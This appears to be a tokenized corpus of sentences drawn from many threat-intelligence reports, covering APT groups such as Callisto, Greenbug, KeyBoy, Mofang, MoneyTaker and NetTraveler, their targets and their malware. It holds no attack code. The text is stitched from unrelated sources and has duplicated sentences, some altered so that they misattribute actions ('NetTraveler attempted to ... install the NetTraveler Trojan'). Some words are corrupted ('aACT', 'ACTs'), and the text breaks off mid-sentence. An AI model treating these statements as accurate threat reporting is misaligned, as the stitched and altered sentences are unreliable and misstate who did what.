conference
.
 
Based
on
our
analysis
of
Callisto
Group
's
usage
of
RCS
Galileo
,
we
believe
the
Callisto
Group
did
not
utilize
the
leaked
RCS
Galileo
source
code
,
but
rather
used
the
leaked
readymade
installers
to
set
up
their
own
installation
of
the
RCS
Galileo
platform
.
 
In
the
known
spear
phishing
attacks
by
the
Callisto
Group
,
they
employed
the
"
Scout
"
malware
tool
from
the
RCS
Galileo
platform
.
 
We
are
confident
the
Callisto
Group
used
this
type
of
access
to
a
target
's
email
account
for
the
purposes
of
sending
spear
phishing
to
other
targets
.
 
If
a
target
of
the
spear
phishing
described
in
"
Phase
2
:
malware
deployment
"
opened
the
email
attachment
and
,
crucially
,
clicked
on
the
icon
in
the
attachment
,
this
would
lead
to
the
target
's
computer
becoming
infected
with
the
"
Scout
"
malware
tool
from
the
RCS
Galileo
platform
.
 
Callisto
Group
and
related
infrastructure
contain
links
to
at
least
Russia
,
Ukraine
,
and
China
.
 
they
have
been
last
known
to
employ
malware
in
February
2016
.
 
RCS
Galileo
platform
.
 
The
spear
phishing
emails
used
in
the
known
attacks
by
the
Callisto
Group
were
so
convincing
that
even
skilled
and
alert
users
would
likely
have
attempted
to
open
the
malicious
attachment
.
 
In
October
2015
the
Callisto
Group
targeted
a
handful
of
individuals
with
phishing
emails
that
attempted
to
obtain
the
target
's
webmail
credentials
.
 
The
Callisto
Group
has
been
active
at
least
since
late
2015
and
continues
to
be
so
,
including
continuing
to
set
up
new
phishing
infrastructure
every
week
.
 
Called
Greenbug
,
this
group
is
believed
to
be
instrumental
in
helping
Shamoon
steal
user
credentials
of
targets
ahead
of
Shamoon
's
destructive
attacks
.
 
On
Tuesday
,
Arbor
Networks
said
that
it
has
new
leads
on
a
credential
stealing
remote
access
Trojan
(
RAT
)
called
Ismdoor
,
possibly
used
by
Greenbug
to
steal
credentials
on
Shamoon
's
behalf
.
 
"
With
our
latest
research
we
now
see
how
Greenbug
has
shifted
aACT
from
HTTP-based
C2
communication
with
Ismdoor
.
 
It's
now
relying
on
a
new
DNS-based
attack
technique
to
better
cloak
command
and
control
communications
between
Greenbug
and
the
malware
"
,
said
Dennis
Schwarz
,
research
analyst
on
Arbor
's
ASERT
Team
,
in
an
interview
with
Threatpost
.
 
t's
now
relying
on
a
new
DNS-based
attack
technique
to
better
cloak
command
and
control
communications
between
Greenbug
and
the
malware
"
,
said
Dennis
Schwarz
,
research
analyst
on
Arbor
's
ASERT
Team
,
in
an
interview
with
Threatpost
.
 
By
relying
on
a
native
PDF
command
to
navigate
to
a
new
URL
,
Zirconium
successfully
circumvented
Chrome
's
anti-redirect
protection
.
 
In
the
context
of
the
Ismdoor
RAT
,
the
DNS
attack
technique
is
used
primarily
by
Greenbug
for
stealing
credentials
.
 
To
do
this
,
it
employs
a
number
of
specific
commands
via
DNSMessenger
.
 
Iranian
Threat
Agent
Greenbug
has
been
registering
domains
similar
to
those
of
Israeli
High-Tech
and
Cyber
Security
Companies
.
 
By
pivoting
off
the
registration
details
and
servers
data
of
the
two
domains
we
discovered
others
registered
by
the
threat
agent
.
 
Named
Trochilus
,
this
new
RAT
was
part
of
Group
27
's
malware
portfolio
that
included
six
other
malware
strains
,
all
served
together
or
in
different
combinations
,
based
on
the
data
that
needed
to
be
stolen
from
each
victim
.
 
According
to
the
security
experts
,
this
collection
of
malware
was
discovered
after
their
first
initial
report
was
published
,
meaning
that
Group
27
ignored
the
fact
they
were
unmasked
and
continued
to
infect
their
targets
regardless
,
through
the
same
entry
point
,
the
Myanmar
Union
Election
Commission
(
UEC
)
website
.
 
Trochilus
RAT
activity
was
discovered
during
both
months
of
October
and
November
2015
.
 
From
September
2016
through
late
November
2016
,
a
threat
actor
group
used
both
the
Trochilus
RAT
and
a
newly
idenfied
RAT
we've
named
MoonWind
to
target
organizations
in
Thailand
,
including
a
utility
organization
.
 
We
chose
the
name
'
MoonWind
'
based
on
debugging
strings
we
saw
within
the
samples
,
as
well
as
the
compiler
used
to
generate
the
samples
.
 
The
attackers
compromised
two
legitimate
Thai
websites
to
host
the
malware
,
which
is
a
tactic
this
group
has
used
in
the
past
.
 
Both
the
Trochilus
and
MoonWind
RATs
were
hosted
on
the
same
compromised
sites
and
used
to
target
the
same
organization
at
the
same
time
.
 
The
attackers
used
different
command
and
control
servers
(
C2s
)
for
each
malware
family
,
a
tactic
we
believe
was
meant
to
thwart
attempts
to
tie
the
attacks
together
using
infrastructure
alone
.
 
Further
research
led
us
to
additional
MoonWind
samples
using
the
same
C2
(
dns.webswindows.com
)
but
hosted
on
a
different
compromised
but
legitimate
website
.
 
The
attacks
in
that
case
took
place
in
late
September
to
early
October
2016
and
the
attackers
stored
the
MoonWind
samples
as
RAR
files
,
while
in
the
November
attacks
the
RATs
were
stored
as
executables
.
 
We
were
not
able
to
find
additional
tools
,
but
the
attackers
again
compromised
a
legitimate
Thai
website
to
host
their
malware
,
in
this
case
the
student
portal
for
a
Thai
University
.
 
Trochilus
was
first
reported
by
Arbor
Networks
in
their
Seven
Pointed
Dagger
report
tying
its
use
to
other
targeted
Southeast
Asia
activity
.
 
The
activity
dates
to
at
least
2013
and
has
ties
to
multiple
reports
by
other
researchers
.
 
It
is
highly
likely
MoonWind
is
yet
another
new
tool
being
used
by
the
group
or
groups
responsible
for
that
activity
,
indicating
they
are
not
only
still
active
but
continuing
to
evolve
their
playbook
.
 
The
samples
provided
were
alleged
to
be
targeting
Tibetan
and
Chinese
Pro-Democracy
Activists
.
 
On
June
7
,
2013
,
Rapid7
released
an
analysis
of
malware
dubbed
'
KeyBoy
'
,
also
exploiting
unknown
vulnerabilities
in
Microsoft
Office
,
similarly
patched
by
MS12-060
,
but
allegedly
targeting
interests
in
Vietnam
and
India
.
 
As
we
have
seen
in
some
previous
targeted
malware
attacks
,
the
attackers
in
this
incident
are
taking
advantage
of
services
like
changeIP
.
 
com
to
establish
free
subdomains
in
their
infrastructure
.
 
Blending
in
with
legitimate
traffic
is
a
common
tactic
used
by
attackers
to
help
fly
under
the
radar
.
 
Subdomains
at
phmail.us
have
been
linked
to
malicious
activity
dating
back
as
far
as
December
2011
.
 
Based
on
the
patterns
of
subdomain
registration
over
time
in
DNS
,
TRAC
believes
this
is
an
example
where
the
attackers
registered
their
own
second-level
domain
.
 
In
this
blog
post
we'll
analyze
two
specific
incidents
apparently
targeting
victims
in
Vietnam
and
in
India
and
we'll
describe
the
capabilities
of
the
custom
backdoor
being
used
that
for
convenience
(
and
to
our
knowledge
,
for
a
lack
of
an
existing
name
)
we
call
KeyBoy
,
due
to
a
string
present
in
one
of
the
samples
.
 
We
encountered
the
first
document
exploit
called
"
THAM
luan
-
GD
-
NCKH2.doc
"
a
few
days
ago
,
which
appears
to
be
leveraging
some
vulnerabilities
patched
with
MS12-060
.
 
This
document
,
written
in
Vietnamese
,
appears
to
be
reviewing
and
discussing
best
practices
for
teaching
and
researching
scientific
topics
.
 
For
the
sake
of
this
analysis
we'll
take
the
Vietnamese
backdoor
as
an
example
;
the
one
found
in
the
Indian
attack
operates
in
the
exact
same
ACT
.
 
In
the
second
set
they
are
making
use
of
a
dynamic
DNS
service
by
ChangeIP
.
 
com
.
 
The
Tibetan
community
has
been
targeted
for
over
a
decade
by
espionage
operations
that
use
malware
to
infiltrate
communications
and
gather
information
.
 
he
Tibetan
community
has
been
targeted
for
over
a
decade
by
espionage
operations
that
use
malware
to
infiltrate
communications
and
gather
information
.
 
They
are
often
targeted
simultaneously
with
other
ethnic
minorities
and
religious
groups
in
China
.
 
Examples
as
early
as
2008
document
malware
operations
against
Tibetan
non-governmental
organizations
(
NGOs
)
that
also
targeted
Falun
Gong
and
Uyghur
groups
.
 
More
recently
in
2016
,
Arbor
Networks
reported
on
connected
malware
operations
continuing
to
target
these
same
groups
,
which
the
Communist
Party
of
China
perceives
as
a
threat
to
its
power
.
 
There
is
the
exploit
code
and
malware
used
to
gain
access
to
systems
,
the
infrastructure
that
provides
command
and
control
to
the
malware
operator
,
and
the
human
elements
developers
who
create
the
malware
,
operators
who
deploy
it
,
and
analysts
who
extract
value
from
the
stolen
information
.
 
For
example
,
we
have
observed
frequent
reuse
of
older
(
patched
)
exploits
in
malware
operations
against
the
Tibetan
community
.
 
These
operations
involved
highly
targeted
email
lures
with
repurposed
content
and
attachments
that
contained
an
updated
version
of
KeyBoy
.
 
In
August
and
October
2016
we
observed
a
malware
operation
targeting
members
of
the
Tibetan
Parliament
(
the
highest
legislative
organ
of
the
Tibetan
government
in
exile
,
formally
known
as
Central
Tibetan
Administration
)
.
 
The
Arbor
report
describes
the
ongoing
use
of
these
four
vulnerabilities
in
a
series
of
espionage
campaigns
against
not
only
Tibetan
groups
,
but
also
others
related
to
Hong
Kong
,
Taiwan
,
and
Uyghur
interests
.
 
The
malware
samples
deployed
in
both
of
these
operations
are
updated
versions
of
the
KeyBoy
backdoor
first
discussed
in
2013
by
Rapid7
.
 
This
behavioural
tactic
was
previously
mentioned
in
relation
to
KeyBoy
in
a
2013
blog
post
by
Cisco
.
 
These
versions
of
KeyBoy
differed
from
the
one
first
described
by
Rapid7
in
several
ACTs
,
many
of
which
will
be
described
in
the
sections
to
follow
.
 
These
samples
were
contained
in
exploit
documents
containing
distinct
lure
content
,
one
having
a
Tibetan
nexus
,
the
other
an
Indian
nexus
.
 
We
believe
the
2013
,
2015
,
and
2016
KeyBoy
samples
provide
evidence
of
a
development
effort
focused
on
changing
components
that
would
be
used
by
researchers
to
develop
detection
signatures
.
 
In
another
modification
,
first
observed
in
the
most
recent
October
11
Parliamentarian
operation
(
version
agewkassif
)
,
the
developer
(s
)
of
KeyBoy
began
using
a
string
obfuscation
routine
in
order
to
hide
many
of
the
critical
values
referenced
within
the
malware
.
 
Trend
Micro
specifically
noted
that
the
2013
versions
of
KeyBoy
used
the
same
algorithm
for
encoding
their
configuration
files
as
was
observed
in
the
Operation
Tropic
Trooper
malware
.
 
This
sample
was
also
found
to
be
deployed
using
the
CVE-2012-0158
vulnerability
.
 
The
operation
against
the
Tibetan
Parliamentarians
illustrates
the
continued
use
of
malicious
attachments
in
the
form
of
documents
bearing
exploits
.
 
Chances
are
about
even
,
though
,
that
Mofang
is
a
relevant
threat
actor
to
any
organization
that
invests
in
Myanmar
or
is
otherwise
politically
involved
.
 
In
addition
to
the
campaign
in
Myanmar
,
Mofang
has
been
observed
to
attack
targets
across
multiple
sectors
(
government
,
military
,
critical
infrastructure
and
the
automotive
and
weapon
industries
)
in
multiple
countries
.
 
This
threat
report
gives
insight
into
some
of
the
information
that
Fox-IT
has
about
a
threat
actor
that
it
follows
,
called
Mofang
.
 
The
name
Mofang
is
based
on
the
Mandarin
verb
,
which
means
to
imitate
.
 
It
is
highly
likely
that
the
Mofang
group
is
a
group
that
operates
out
of
China
and
is
probably
government-affiliated
.
 
Chapter
7
explains
the
working
of
Mofang
's
preferred
tools
:
ShimRat
and
SimRatReporter
.
 
The
Mofang
group
has
been
active
in
relation
to
the
Kyaukphyu
sez
.
 
KeyBoy
provides
basic
backdoor
functionality
,
allowing
the
operators
to
select
from
various
capabilities
used
to
surveil
and
steal
information
from
the
victim
machine
.
 
The
first
attack
started
in
early
July
with
a
ShimRatReporter
payload
.
 
Myanmar
has
been
the
target
of
Mofang
's
attacks
for
years
before
the
campaign
related
to
the
sez
.
 
In
late
September
2015
Mofang
used
the
website
of
Myanmar
's
national
airline
hosted
at
www.flymna.com
for
an
attack
against
an
organization
in
Myanmar
.
 
In
December
2012
Mofang
started
a
campaign
against
a
new
target
,
called
'
seg
'
for
the
purpose
of
this
report
.
 
From
the
configuration
it
can
be
determined
that
the
company
was
running
F-Secure
Antivirus
and
Mofang
registered
the
domain
to
not
appear
suspicious
.
 
In
September
2015
Mofang
launched
another
attack
.
 
A
new
version
of
ShimRat
was
built
on
the
7th
of
September
,
uploaded
to
the
server
and
only
days
later
used
in
a
new
campaign
.
 
MoneyTaker
has
primarily
been
targeting
card
processing
systems
,
including
the
AWS
CBR
(
Russian
Interbank
System
)
and
purportedly
SWIFT
(
US
)
.
 
Given
the
wide
usage
of
STAR
in
LATAM
,
financial
institutions
in
LATAM
could
have
particular
exposure
to
a
potential
interest
from
the
MoneyTaker
group
.
 
In
addition
to
banks
,
the
MoneyTaker
group
has
attacked
law
firms
and
also
financial
software
vendors
.
 
Since
that
time
,
the
group
attacked
companies
in
California
,
Utah
,
Oklahoma
,
Colorado
,
Illinois
,
Missouri
,
South
Carolina
,
North
Carolina
,
Virginia
and
Florida
.
 
The
first
attack
in
the
US
that
Group-IB
attributes
to
MoneyTaker
was
conducted
in
the
spring
of
2016
:
money
was
stolen
from
the
bank
by
gaining
access
to
First
Data
's
"
STAR
"
network
operator
portal
.
 
The
first
attack
in
the
US
that
Group-IB
attributes
to
this
group
was
conducted
in
the
spring
of
2016
:
money
was
stolen
from
the
bank
by
gaining
access
to
First
Data
's
"
STAR
"
network
operator
portal
.
 
In
2017
,
the
number
of
MoneyTaker
's
attacks
has
remained
the
same
with
8
US
banks
,
1
law
firm
and
1
bank
in
Russia
being
targeted
.
 
In
2017
,
the
number
of
attacks
has
remained
the
same
with
8
US
banks
,
1
law
firm
and
1
bank
in
Russia
being
targeted
.
 
By
analyzing
the
attack
infrastructure
,
Group-IB
identified
that
MoneyTaker
group
continuously
exfiltrates
internal
banking
documentation
to
learn
about
bank
operations
in
preparation
for
future
attacks
.
 
Group-IB
reports
that
MoneyTaker
uses
both
borrowed
and
their
own
self-written
tools
.
 
Group-IB
has
provided
Europol
and
Interpol
with
detailed
information
about
the
MoneyTaker
group
for
further
investigative
activities
as
part
of
our
cooperation
in
fighting
cybercrime
.
 
In
late
September
2015
Mofang
used
the
website
of
Myanmara
's
national
airline
hosted
at
www.flymna.com
for
an
attack
against
an
organization
in
Myanmar
.
 
To
control
the
full
operation
,
MoneyTaker
uses
a
Pentest
framework
Server
.
 
On
it
,
MoneyTaker
install
a
legitimate
tool
for
penetration
testing
Metasploit
.
 
At
the
end
of
June
2015
Mofang
started
its
campaign
to
gather
information
of
a
specific
target
in
relation
to
the
sezs
:
the
cpg
Corporation
.
 
MoneyTaker
uses
'
fileless
'
malware
only
existing
in
RAM
and
is
destroyed
after
reboot
.
 
To
ensure
persistence
in
the
system
MoneyTaker
relies
on
PowerShell
and
VBS
scripts
-
they
are
both
difficult
to
detect
by
antivirus
and
easy
to
modify
.
 
After
successfully
infecting
one
of
the
computers
and
gaining
initial
access
to
the
system
,
the
attackers
perform
reconnaissance
of
the
local
network
in
order
to
gain
domain
administrator
privileges
and
eventually
consolidate
control
over
the
network
.
 
MUSTANG
PANDA
has
previously
used
the
observed
microblogging
site
to
host
malicious
PowerShell
scripts
and
Microsoft
Office
documents
in
targeted
attacks
on
Mongolia-focused
NGOs
.
 
This
newly
observed
activity
uses
a
series
of
redirections
and
fileless
,
malicious
implementations
of
legitimate
tools
to
gain
access
to
the
targeted
systems
.
 
Unit
42
recently
identified
a
targeted
attack
against
an
individual
working
for
the
Foreign
Ministry
of
Uzbekistan
in
China
.
 
Since
that
time
,
MoneyTaker
attacked
companies
in
California
,
Utah
,
Oklahoma
,
Colorado
,
Illinois
,
Missouri
,
South
Carolina
,
North
Carolina
,
Virginia
and
Florida
.
 
In
their
Operation
Tropic
Trooper
report
,
Trend
Micro
documented
the
behaviour
and
functionality
of
an
espionage
toolkit
with
several
design
similarities
to
those
observed
in
the
various
components
of
KeyBoy
.
 
Our
analysis
shows
that
actors
attempted
to
exploit
CVE-2012-0158
to
install
NetTraveler
Trojan
.
 
Unit
42
's
analysis
shows
that
NetTraveler
attempted
to
exploit
CVE-2012-0158
to
install
NetTraveler
Trojan
.
 
Our
analysis
shows
that
NetTraveler
attempted
to
exploit
CVE-2012-0158
to
install
NetTraveler
Trojan
.
 
In
2016
,
Group-IB
identified
10
attacks
conducted
by
MoneyTaker
,
6
attacks
on
banks
in
the
US
,
1
attack
on
a
US
service
provider
,
1
attack
on
a
bank
in
the
UK
and
2
attacks
on
Russian
banks
.
 
If
KeyBoy
is
a
single
component
of
a
larger
espionage
toolkit
,
the
developers
may
have
realized
that
this
older
,
static-key
based
,
configuration
encoding
algorithm
was
inadvertently
providing
a
link
between
disparate
components
of
their
malware
suite
.
 
In
2016
,
Group-IB
identified
10
attacks
conducted
by
MoneyTaker
;
6
attacks
on
banks
in
the
US
,
1
attack
on
a
US
service
provider
,
1
attack
on
a
bank
in
the
UK
and
2
attacks
on
Russian
banks
.
 
The
NetTraveler
trojan
has
been
known
to
be
used
in
targeted
cyber
espionage
attacks
for
more
than
a
decade
by
nation
state
threat
actors
and
continues
to
be
used
to
target
its
victims
and
exfiltrate
data
.
 
The
exploit
document
carrying
this
alternate
KeyBoy
configuration
also
used
a
decoy
document
which
was
displayed
to
the
user
after
the
exploit
launched
.
 
Only
one
incident
involving
a
Russian
bank
was
promptly
identified
and
prevented
that
is
known
to
Group-IB
.
 
This
program
is
designed
to
capture
keystrokes
,
take
screenshots
of
the
user
's
desktop
and
get
contents
from
the
clipboard
.
 
To
conduct
targeted
attacks
,
MoneyTaker
use
a
distributed
infrastructure
that
is
difficult
to
track
.
 
This
technique
hides
the
true
C2
server
from
researchers
that
do
not
have
access
to
both
the
rastls.dll
and
Sycmentec.config
files
.
 
Hackers
use
Metasploit
to
conduct
all
these
activities
:
network
reconnaissance
,
search
for
vulnerable
applications
,
exploit
vulnerabilities
,
escalate
systems
privileges
,
and
collect
information
.
 
Over
the
years
they've
used
application
components
from
Norman
,
McAfee
and
Norton
.
 
Recently
,
Falcon
Intelligence
observed
new
activity
from
MUSTANG
PANDA
,
using
a
unique
infection
chain
to
target
likely
Mongolia-based
victims
.
 
Throughout
the
years
,
the
Mofang
group
has
compromised
countless
servers
belonging
to
government
or
other
Myanmar
related
organizations
,
in
order
to
stage
attacks
.
 
This
file
requires
the
target
to
attempt
to
open
the
.lnk
file
,
which
redirects
the
user
to
a
Windows
Scripting
Component
(
.wsc
)
file
,
hosted
on
an
adversary-controlled
microblogging
page
.
 
A
report
published
by
Kaspersky
Labs
in
2011
on
NetTraveler
also
mentions
the
C2
servers
were
being
hosted
by
Krypt
Technolgies
.
 
Obviously
,
the
developers
behind
NetTraveler
have
taken
steps
to
try
to
hide
the
malware
's
configuration
.
 
In
this
report
,
we'll
review
how
the
actors
attempted
to
exploit
CVE-2012-0158
to
install
the
NetTraveler
Trojan
.
 
In
this
report
,
we'll
review
how
NetTraveler
attempted
to
exploit
CVE-2012-0158
to
install
the
NetTraveler
Trojan
.
 
In
this
report
,
we'll
review
how
the
NetTraveler
attempted
to
exploit
CVE-2012-0158
to
install
the
NetTraveler
Trojan
.
 
Upon
successful
exploitation
,
the
attachment
will
install
the
Trojan
known
as
NetTraveler
using
a
DLL
side-loading
attack
technique
.
 
NetTraveler
has
been
used
to
target
diplomats
,
embassies
and
government
institutions
for
over
a
decade
,
and
remains
the
tool
of
choice
by
the
adversaries
behind
these
cyber
espionage
campaigns
.
 
WildFire
correctly
classifies
NetTraveler
as
malicious
.
 
The
NetTraveler
group
has
infected
victims
across
multiple
establishments
in
both
the
public
and
private
sector
including
government
institutions
,
embassies
,
the
oil
and
gas
industry
,
research
centers
,
military
contractors
and
activists
.
 
Today
Kaspersky
Lab
's
team
of
experts
published
a
new
research
report
about
NetTraveler
,
which
is
a
family
of
malicious
programs
used
by
APT
actors
to
successfully
compromise
more
than
350
high-profile
victims
in
40
countries
.
 
According
to
Kaspersky
Lab
's
report
,
this
threat
actor
has
been
active
since
as
early
as
2004
;
however
,
the
highest
volume
of
activity
occurred
from
2010
2013
.
 
Most
recently
,
the
NetTraveler
group
's
main
domains
of
interest
for
cyberespionage
activities
include
space
exploration
,
nanotechnology
,
energy
production
,
nuclear
power
,
lasers
,
medicine
and
communications
.
 
In
addition
,
the
NetTraveler
toolkit
was
able
to
install
additional
info-stealing
malware
as
a
backdoor
,
and
it
could
be
customized
to
steal
other
types
of
sensitive
information
such
as
configuration
details
for
an
application
or
computer-aided
design
files
.
 
During
Kaspersky
Lab
's
analysis
of
NetTraveler
,
the
company
's
experts
identified
six
victims
that
had
been
infected
by
both
NetTraveler
and
Red
October
,
which
was
another
cyberespionage
operation
analyzed
by
Kaspersky
Lab
in
January
2013
.
 
Kaspersky
Lab
's
products
detect
and
neutralize
the
malicious
programs
and
its
variants
used
by
the
NetTraveler
Toolkit
,
including
Trojan-Spy.Win32.TravNet
and
Downloader.Win32.NetTraveler
.
 
Based
on
Kaspersky
Lab
's
analysis
of
NetTraveler
's
C&C
data
,
there
were
a
total
of
350
victims
in
40
countries
across
including
the
United
States
,
Canada
,
United
Kingdom
,
Russia
,
Chile
,
Morocco
,
Greece
,
Belgium
,
Austria
,
Ukraine
,
Lithuania
,
Belarus
,
Australia
,
Hong
Kong
,
Japan
,
China
,
Mongolia
,
Iran
,
Turkey
,
India
,
Pakistan
,
South
Korea
,
Thailand
,
Qatar
,
Kazakhstan
,
and
Jordan
.
 
Kaspersky
Lab
's
products
detect
the
Microsoft
Office
exploits
used
in
the
spear-phishing
attacks
,
including
Exploit.MSWord.CVE-2010-333
,
Exploit.Win32.CVE-2012-0158
.
 
In
this
case
,
it
was
a
group
commonly
referred
to
as
"
Nitro
"
,
which
was
coined
by
Symantec
in
its
2011
whitepaper
.
 
Historically
,
Nitro
is
known
for
targeted
spear
phishing
campaigns
and
using
Poison
Ivy
malware
,
which
was
not
seen
in
these
attacks
.
 
Since
at
least
2013
,
Nitro
appears
to
have
somewhat
modified
their
malware
and
delivery
methods
to
include
Spindest
and
legitimate
compromised
websites
,
as
reported
by
Cyber
Squared
's
TCIRT
.
 
In
July
,
Nitro
compromised
a
South
Korean
clothing
and
accessories
manufacturer
's
website
to
serve
malware
commonly
referred
to
as
"
Spindest
"
.
 
Of
all
the
samples
we've
tied
to
this
activity
so
far
noted
in
this
blog
,
this
is
the
only
one
configured
to
connect
directly
to
an
IP
address
for
Command
and
Control
(
C2
)
.
 
The
next
sample
was
another
Spindest
variant
and
had
the
same
timestamp
as
the
aforementioned
PcClient
sample
.
 
As
this
post
and
previous
cited
research
show
,
APT
groups
such
as
Nitro
will
continue
to
evolve
their
techniques
within
the
kill
chain
to
avoid
detection
.
 
attacks
on
the
chemical
industry
are
merely
their
latest
attack
wave
.
 
The
goal
of
the
attackers
appears
to
be
to
collect
intellectual
property
such
as
design
documents
,
formulas
,
and
manufacturing
processes
.
 
The
attack
wave
started
in
late
July
2011
and
continued
into
midSeptember
2011
.
 
The
purpose
of
the
attacks
appears
to
be
industrial
espionage
,
collecting
intellectual
property
for
competitive
advantage
.
 
They
then
moved
on
to
the
motor
industry
in
late
May
.
 
From
late
April
to
early
May
,
the
attackers
focused
on
human
rights
related
NGOs
.
 
Attackers
then
moved
on
to
the
motor
industry
in
late
May
.
 
At
this
point
,
the
current
attack
campaign
against
the
chemical
industry
began
.
 
The
attackers
first
researched
desired
targets
and
then
sent
an
email
specifically
to
the
target
.
 
First
,
when
a
specific
recipient
was
targeted
,
the
mails
often
purported
to
be
meeting
invitations
from
established
business
partners
.
 
While
the
attackers
used
different
pretexts
when
sending
these
malicious
emails
,
two
methodologies
stood
out
.
 
Secondly
,
when
the
emails
were
being
sent
to
a
broad
set
of
recipients
,
the
mails
purported
to
be
a
necessary
security
update
.
 
The
attacks
were
traced
back
to
a
computer
system
that
was
a
virtual
private
server
(
VPS
)
located
in
the
United
States
.
 
Attackers
are
sending
malicious
PDF
and
DOC
files
,
which
use
exploits
to
drop
variants
of
Backdoor.Sogu
.
 
This
particular
threat
was
also
used
by
hackers
to
compromise
a
Korean
social
network
site
to
steal
records
of
35
million
users
.
 
The
Sogu
gang
use
a
custom
developed
threat
Backdoor.Sogu
,
whereas
the
group
described
in
this
document
use
an
off
the
shelf
threat
Poison
Ivy
.
 
The
Sogu
gang
,
in
contrast
,
use
PDF
and
DOC
files
in
very
tailored
,
targeted
emails
.
 
These
attacks
are
primarily
targeting
private
industry
in
search
of
key
intellectual
property
for
competitive
advantage
,
military
institutions
,
and
governmental
organizations
often
in
search
of
documents
related
to
current
political
events
and
human
rights
organizations
.
 
Nitro
's
campaign
focused
on
the
chemical
sector
with
the
goal
of
obtaining
sensitive
documents
such
as
proprietary
designs
,
formulas
,
and
manufacturing
processes
.
 
This
attack
campaign
focused
on
the
chemical
sector
with
the
goal
of
obtaining
sensitive
documents
such
as
proprietary
designs
,
formulas
,
and
manufacturing
processes
.
 
These
have
been
highly
active
in
the
Middle
East
region
and
unveiled
ongoing
targeted
attacks
in
multiple
regions
.
 
The
attackers
try
to
lure
targets
through
spear
phishing
emails
that
include
compressed
executables
.
 
We
found
that
the
group
behind
this
campaign
targeted
mainly
industrial
,
engineering
and
manufacturing
organizations
in
more
than
30
countries
.
 
Using
the
Kaspersky
Security
Network
(
KSN
)
and
artifacts
from
malware
files
and
attack
sites
,
we
were
able
to
trace
the
attacks
back
to
March
2015
.
 
Operation
Ghoul
is
one
of
the
many
attacks
in
the
wild
targeting
industrial
,
manufacturing
and
engineering
organizations
,
Kaspersky
Lab
recommends
users
to
be
extra
cautious
while
checking
and
opening
emails
and
attachments
.
 
The
main
point
that
sets
Operation
Groundbait
apart
from
the
other
attacks
is
that
it
has
mostly
been
targeting
anti-government
separatists
in
the
self-declared
Donetsk
and
Luhansk
People
's
Republics
.
 
The
attacks
appear
to
be
geopolitically
motivated
and
target
high
profile
organizations
.
 
The
objective
of
the
attacks
is
clearly
espionage
they
involve
gaining
access
to
top
legislative
,
executive
and
judicial
bodies
around
the
world
.
 
The
attackers
have
targeted
a
large
number
of
organizations
globally
since
early
2017
,
with
the
main
focus
on
the
Middle
East
and
North
Africa
(
MENA
)
,
especially
Palestine
.
 
The
attacks
were
initially
discovered
while
investigating
a
phishing
attack
that
targeted
political
figures
in
the
MENA
region
.
 
Like
BlackEnergy
(
a.k.a.
Sandworm
,
Quedagh
)
,
Potao
is
an
example
of
targeted
espionage
(
APT
)
malware
detected
mostly
in
Ukraine
and
a
number
of
other
CIS
countries
,
including
Russia
,
Georgia
and
Belarus
.
 
The
main
reason
for
the
increase
in
Potao
detections
in
2014
and
2015
were
infections
through
USB
drives
.
 
The
first
Potao
campaign
that
we
examined
took
place
in
August
2011
.
 
In
March
2014
,
the
gang
behind
Potao
started
using
a
new
infection
vector
.
 
Since
March
2015
,
ESET
has
detected
Potao
binaries
at
several
high-value
Ukrainian
targets
that
include
government
and
military
entities
and
one
of
the
major
Ukrainian
news
agencies
.
 
As
confirmation
that
the
malware
writers
are
still
very
active
even
at
the
time
of
this
writing
,
ESET
detected
a
new
Potao
sample
compiled
on
July
20
,
2015
.
 
In
the
previous
pages
we
have
presented
our
findings
based
on
ESET
detection
telemetry
and
our
analysis
of
Win32/Potao
and
Win32/FakeTC
samples
.
 
Potao
is
another
example
of
targeted
espionage
malware
,
a
so-called
APT
,
to
use
the
popular
buzzword
,
although
technically
the
malware
is
not
particularly
advanced
or
sophisticated
.
 
Examples
of
notable
Potao
dissemination
techniques
,
some
of
which
were
previously
unseen
,
or
at
least
relatively
uncommon
,
include
the
use
of
highly-targeted
spear-phishing
SMS
messages
to
drive
potential
victims
to
malware
download
sites
and
USB
worm
functionality
that
tricked
the
user
into
'
willingly
'
executing
the
Trojan
.
 
The
PassCV
group
continues
to
be
one
of
the
most
successful
and
active
threat
groups
that
leverage
a
wide
array
of
stolen
Authenticode-signing
certificates
.
 
The
PassCV
group
typically
utilized
publicly
available
RATs
in
addition
to
some
custom
code
,
which
ultimately
provided
backdoor
functionality
to
affected
systems
via
phony
resumes
and
curriculum
vitae
(
CVs
)
.
 
he
PassCV
group
typically
utilized
publicly
available
RATs
in
addition
to
some
custom
code
,
which
ultimately
provided
backdoor
functionality
to
affected
systems
via
phony
resumes
and
curriculum
vitae
(
CVs
)
.
 
PassCV
continues
to
maintain
a
heavy
reliance
on
obfuscated
and
signed
versions
of
older
RATs
like
ZxShell
and
Ghost
RAT
,
which
have
remained
a
favorite
of
the
wider
Chinese
criminal
community
since
their
initial
public
release
.
 
SPEAR
identified
recent
PassCV
samples
which
implemented
another
commercial
off-the-shelf
(
COTS
)
RAT
called
Netwire
.
 
SPEAR
identified
recent
PassCV
samples
which
implemented
another
commercial
off-the-shelf
(
COTS
)
RAT
called
Netwire
.
 
The
first
new
connection
SPEAR
identified
was
derived
from
an
email
address
listed
in
Blue
Coat
Systems'
original
report
on
PassCV
.
 
Syncopate
is
a
well-known
Russian
company
that
is
best
known
as
the
developer
and
operator
of
the
'
GameNet
'
platform
.
 
The
PassCV
group
continues
to
be
extremely
effective
in
compromising
both
small
and
large
game
companies
and
surreptitiously
using
their
code-signing
certificates
to
infect
an
even
larger
swath
of
organizations
.
 
Since
the
last
report
,
PassCV
has
significantly
expanded
its
targets
to
include
victims
in
the
United
States
,
Taiwan
,
China
and
Russia
.
 
Based
on
data
collected
from
Palo
Alto
Networks
AutoFocus
threat
intelligence
,
we
discovered
continued
operations
of
activity
very
similar
to
the
Roaming
Tiger
attack
campaign
that
began
in
the
August
2015
timeframe
,
with
a
concentration
of
attacks
in
late
October
and
continuing
into
December
.
 
The
files
exploit
the
well-known
Microsoft
Office
vulnerability
,
CVE-2012-0158
,
to
execute
malicious
code
in
order
to
take
control
of
the
targeted
systems
.
 
BBSRAT
is
typically
packaged
within
a
portable
executable
file
,
although
in
a
few
of
the
observed
instances
,
a
raw
DLL
was
discovered
to
contain
BBSRAT
.
 
WildFire
properly
classifies
BBSRAT
malware
samples
as
malicious
.
 
This
week
we
will
discuss
another
Chinese
nexus
adversary
we
call
Samurai
Panda
.
 
Samurai
Panda
is
interesting
in
that
their
target
selection
tends
to
focus
on
Asia
Pacific
victims
in
Japan
,
the
Republic
of
Korea
,
and
other
democratic
Asian
victims
.
 
Next
,
in
